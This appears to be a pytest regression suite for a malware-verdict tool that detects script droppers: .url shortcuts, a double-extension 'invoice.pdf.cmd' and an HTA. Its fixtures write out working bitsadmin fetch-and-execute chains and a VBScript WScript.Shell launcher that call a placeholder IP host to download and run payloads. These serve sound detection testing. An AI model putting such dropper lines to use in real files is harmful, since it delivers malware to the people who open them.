"""Regression tests for the 2026-11-24 accuracy fix wave 2
(script-class droppers). Campaign smoke run 5 returned NO ACCOUNTED
for three confirmed malware samples, all small script-class delivery
files from one Gozi and Ursnif lure set: a .url shortcut to a remote
payload, a disguised double-extension batch file, and an .HTA
downloader. Synthetic fixtures only, authored here; no sample was
downloaded. See validation/FIX-LOG-2026-11-24-WAVE2.md for the
diagnosis and the per-class fix notes."""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from event_zero.verdict import verdict, script_class_findings


def write(tmp_path, name, data, sub=""):
    d = tmp_path / sub if sub else tmp_path
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return str(p)


URL_EVIL = "[InternetShortcut]\r\nURL=http://198.51.100.23/payload.exe\r\nIconFile=C:\\Windows\\System32\\shell32.dll\r\nIconIndex=13\r\n"
URL_EVIL_IP = "[InternetShortcut]\r\nURL=http://198.51.100.23/stage2\r\n"
URL_BENIGN = "[InternetShortcut]\r\nURL=https://example.com/articles/how-to-cook\r\n"
CMD_DROPPER = ("@echo off\r\n"
               "bitsadmin /transfer getjob http://198.51.100.23/payload.exe %TEMP%\\payload.exe\r\n"
               "start \"\" %TEMP%\\payload.exe\r\n")
CMD_PLAIN = "@echo off\r\necho Hello, world\r\npause\r\n"
CMD_COMMENT_URL = ("@echo off\r\n"
                   "rem The manual lives at https://example.com/tool.exe if you need it\r\n"
                   "echo done\r\n")
CMD_FETCH_DATA = ("@echo off\r\n"
                  "bitsadmin /transfer datajob https://example.com/data.json %CD%\\data.json\r\n"
                  "echo fetched\r\n")
HTA_DROPPER = ("<html><head><title>Invoice</title><HTA:APPLICATION ID=\"x\" /></head>\r\n"
               "<script language=\"VBScript\">\r\n"
               "Dim s: Set s = CreateObject(\"WScript.Shell\")\r\n"
               "s.Run \"bitsadmin /transfer j http://198.51.100.23/p.exe %TEMP%\\p.exe\", 0\r\n"
               "s.Run \"%TEMP%\\p.exe\", 0\r\n"
               "window.close\r\n</script><body></body></html>\r\n")
HTA_BENIGN = "<html><head><HTA:APPLICATION ID=\"x\" /></head><body><p>Hello</p></body></html>\r\n"


def kinds(v):
    return [f["kind"] for f in v["files"][0].get("script_class_findings", [])]


# ---- class 1: .url shortcut to a remote executable payload ----
def test_wave2_url_shortcut_remote_payload_blocks_no(tmp_path):
    v = verdict(write(tmp_path, "Gennaio_url.url", URL_EVIL))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert v["files"][0]["verdict"] == "YES: UNACCOUNTED"
    assert "url-shortcut-remote-payload" in kinds(v)
    assert any("remote executable payload" in u for u in v["unaccounted"])


def test_wave2_url_shortcut_bare_ip_payload_blocks_no(tmp_path):
    # the adjudicated sample pointed at a dotted-quad host; an
    # extensionless payload path on a bare IP is the same shape
    v = verdict(write(tmp_path, "link.url", URL_EVIL_IP))
    assert v["headline"] != "NO: NO MALWARE"
    assert "url-shortcut-remote-payload" in kinds(v)


def test_wave2_benign_url_shortcut_still_no(tmp_path):
    v = verdict(write(tmp_path, "recipe.url", URL_BENIGN))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0].get("script_class_findings") is None


# ---- class 2: disguised double extension batch dropper ----
def test_wave2_pdf_cmd_bitsadmin_chain_blocks_no(tmp_path):
    v = verdict(write(tmp_path, "invoice.pdf.cmd", CMD_DROPPER))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert v["files"][0]["verdict"] == "YES: UNACCOUNTED"
    assert "remote-fetch-and-execute" in kinds(v)
    assert "disguised-double-extension" in kinds(v)


def test_wave2_double_extension_alone_blocks_no(tmp_path):
    # benign content under a disguised name: the name alone blocks
    # NO (unaccounted, never proven), because the file misstates
    # what it is
    v = verdict(write(tmp_path, "notes.txt.cmd", CMD_PLAIN))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert kinds(v) == ["disguised-double-extension"]


def test_wave2_plain_cmd_echo_still_no(tmp_path):
    v = verdict(write(tmp_path, "hello.cmd", CMD_PLAIN))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0].get("script_class_findings") is None


# ---- class 3: .hta downloader ----
def test_wave2_hta_bitsadmin_blocks_no(tmp_path):
    v = verdict(write(tmp_path, "azienda.hta", HTA_DROPPER))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert v["files"][0]["verdict"] == "YES: UNACCOUNTED"
    assert "remote-fetch-and-execute" in kinds(v)
    assert any("fetch-and-execute" in u for u in v["unaccounted"])


def test_wave2_benign_hta_still_no(tmp_path):
    v = verdict(write(tmp_path, "panel.hta", HTA_BENIGN))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0].get("script_class_findings") is None


# ---- controls: the chain, not the atom, is what blocks ----
def test_wave2_url_in_comment_does_not_block(tmp_path):
    # a script that merely mentions a URL, even one naming an
    # executable, fetches nothing and executes nothing remote
    v = verdict(write(tmp_path, "helper.cmd", CMD_COMMENT_URL))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0].get("script_class_findings") is None


def test_wave2_fetch_data_without_execute_does_not_block(tmp_path):
    # downloading data is not a fetch-and-execute chain: no
    # execution side, and the fetched file is not an executable
    v = verdict(write(tmp_path, "refresh.cmd", CMD_FETCH_DATA))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0].get("script_class_findings") is None


def test_wave2_finding_function_directly():
    assert script_class_findings("x.url", URL_EVIL.encode())
    assert script_class_findings("x.url", URL_BENIGN.encode()) == []
    assert script_class_findings("x.cmd", CMD_PLAIN.encode()) == []


# ---- exemption: byte identity to a known original accounts ----
def test_wave2_byte_identity_exempts(tmp_path):
    genuine = write(tmp_path, "invoice.pdf.cmd", CMD_DROPPER, "genuine")
    release = write(tmp_path, "invoice.pdf.cmd", CMD_DROPPER, "release")
    v = verdict(os.path.dirname(release), reference=os.path.dirname(genuine))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0]["reference"] == "hash-match"
